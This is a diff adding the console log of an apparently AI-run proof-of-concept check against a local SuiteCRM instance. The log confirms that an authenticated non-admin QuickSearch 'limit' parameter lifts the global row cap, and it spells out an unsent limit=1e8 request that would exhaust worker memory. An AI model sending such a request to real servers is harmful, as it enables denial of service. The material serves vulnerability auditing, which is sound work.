@@ -1,0 +1,19 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-060/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-060/../.venv
+========================================================================
+VULN-060: QuickSearch attacker-controlled limit bypasses list_max_entries_per_page
+target: http://localhost:33116
+========================================================================
+[INFO] Sink: modules/Home/QuickSearch.php:514-517 (no upper clamp) + :374,459 (limit->get_list)
+[INFO] Configured safety ceiling: list_max_entries_per_page default = 20 (include/utils.php:166/:450)
+[SETUP] Logging in as a fresh LOW-PRIVILEGE user (QuickSearch is not admin-gated -- any authenticated session reaches it)
+[OK] authenticated as mod_aaaa2c2a (non-admin)
+[STEP] Request A: limit=15 (well under the 20-row default cap)
+[PROOF]   -> HTTP 200, totalCount=15
+[STEP] Request B: limit=45 (ABOVE the 20-row default cap, but still a small, safe number -- NOT the catastrophic 1e8 a real attacker could send)
+[PROOF]   -> HTTP 200, totalCount=45
+[STEP] Control: request with NO 'limit' key at all (baseline QuickSearch behaviour)
+[PROOF]   -> HTTP 200, totalCount=20
+[PROOF] totalCount at limit=45 = 45, which is ABOVE the configured 20-row safety ceiling -- proves the per-request 'limit' value raised $sugar_config['list_max_entries_per_page'] itself (QuickSearch.php:516), not just this one query's row count
+[PROOF] Analytical extrapolation (NOT sent): the identical code path with limit=100000000 would set list_max_entries_per_page to 100000001 and issue `get_list($orderBy, $where, 0, 100000000, -1, 0, ...)` -- MySQL would be asked for up to 1e8 rows and PHP would attempt to hydrate one SugarBean object per returned row, which exhausts the PHP memory_limit long before completing; the same request repeated a handful of times saturates the whole worker pool
+==> VULN-060: CONFIRMED — authenticated (non-admin) QuickSearch request with limit=45 returned totalCount=45 > configured default cap 20 -- the attacker-supplied limit demonstrably raised the server's global row-cap with no upper bound; limit=1e8 would OOM a worker (not sent, per bounded-DoS safety rule)
